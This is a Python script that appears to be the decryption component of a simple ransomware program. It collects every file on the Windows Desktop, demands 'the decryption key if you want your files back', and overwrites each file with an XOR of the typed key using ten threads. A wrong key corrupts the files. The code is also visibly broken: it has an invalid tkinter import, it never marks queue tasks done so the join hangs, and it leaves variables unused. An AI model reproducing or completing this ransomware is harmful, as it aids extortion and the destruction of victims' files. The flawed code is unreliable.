import os
import threading
import queue
from tkinter import tk

def decryption(key):
    while True:
        file = q.get()
        print(f"Decrypting files")
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''            
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f"{file} decrypted successfully")
        except Exception as e:
            print(f"Failed to decrypt file due to {e}") 

ENCRYPTION_LEVEL = 512 // 8
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_length = len(key_char_pool)

# Navigate directory to encrypt all the files
print("Gathering files....")
desktop_path = os.environ["USERPROFILE"]+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f"{desktop_path}\\{f}") and f != __file__[:-2]+'exe':
        abs_files.append(f"{desktop_path}\\{f}") 
print("All files located")   

key = input("Please enter the decryption key if you want your files back: ")

# Store files into queue for multi-thread encryption handling
q = queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=decryption, args=(key,), daemon=True)
    t.start()

q.join()
print("Decryption completed")